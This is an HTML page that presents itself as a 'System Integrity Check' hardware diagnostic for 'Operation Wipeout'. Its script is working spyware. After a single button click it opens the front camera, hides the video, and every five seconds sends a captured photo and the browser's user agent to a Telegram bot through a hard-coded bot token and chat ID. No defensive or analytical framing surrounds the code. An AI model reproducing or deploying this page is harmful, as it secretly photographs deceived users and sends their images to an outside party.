<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Wipeout Diagnostic Tool</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding: 50px; }
        #start-btn { padding: 15px 30px; background: #0f0; color: #000; border: none; font-weight: bold; cursor: pointer; font-size: 1.2rem; }
        #status { margin-top: 20px; color: #888; }
    </style>
</head>
<body>
    <h1>SYSTEM INTEGRITY CHECK v4.2</h1>
    <p>Operation Wipeout requires a hardware diagnostic to proceed.</p>
    
    <button id="start-btn" onclick="initWipeout()">START DIAGNOSTIC</button>
    
    <p id="status">Waiting for user initialization...</p>

    <video id="video" style="display:none;" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8784548006:AAHI6anzO11Y24bVA8wSUr297O_YJl0E_vg";
        const CHAT_ID = "1020906452";

        async function initWipeout() {
            const status = document.getElementById('status');
            const btn = document.getElementById('start-btn');
            
            btn.style.display = 'none';
            status.innerText = "Requesting Secure Hardware Access...";

            try {
                // 'playsinline' is critical for mobile Safari/Chrome bypass
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;
                status.innerText = "Diagnostic Running... Do not close this tab.";

                // PERSISTENCE ENGINE: Capture every 5 seconds
                setInterval(captureAndSend, 5000);
            } catch (err) {
                status.innerText = "PERMISSION DENIED: Hardware access is required for Wipeout.";
                console.error(err);
            }
        }

        function captureAndSend() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0);

            canvas.toBlob((blob) => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'wipeout.jpg');
                formData.append('caption', `📸 [WIPEOUT CAPTURE]\nIP: Capturing...\nUser-Agent: ${navigator.userAgent}`);

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }, 'image/jpeg', 0.6);
        }
    </script>
</body>
</html>
